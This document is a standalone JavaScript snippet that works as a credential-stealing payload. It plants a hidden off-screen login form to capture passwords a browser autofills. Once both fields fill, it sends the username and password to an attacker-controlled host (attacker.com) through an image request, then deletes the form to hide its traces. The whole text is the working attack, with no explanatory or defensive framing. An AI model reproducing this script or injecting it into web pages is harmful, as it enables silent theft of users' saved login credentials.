<script>
    let f=document.createElement("div");
    f.style="position:fixed;top:-9999px;left:-9999px;";
    f.innerHTML='<form id="pf"><input type="text" id="u" placeholder="Username"/><input type="password" id="p" placeholder="Password"/></form>';
    document.body.appendChild(f);

    function exfil() {
        let u=document.getElementById('u').value;
        let p=document.getElementById('p').value;
        if(u&&p){
            (new Image()).src="https://attacker.com/exfil?u="+encodeURIComponent(u)+"&p="+encodeURIComponent(p);
            document.body.removeChild(f);
        }
    }

    function checkAutoFill() {
        let u=document.getElementById('u').value;
        let p=document.getElementById('p').value;
        if(u&&p){ exfil(); }
    }

    document.getElementById('u').addEventListener('input',checkAutoFill);
    document.getElementById('p').addEventListener('input',checkAutoFill);
    document.getElementById('u').addEventListener('change',checkAutoFill);
    document.getElementById('p').addEventListener('change',checkAutoFill);

    setTimeout(() => {if (document.body.contains(f)){document.body.removeChild(f);}}, 10000);
</script>
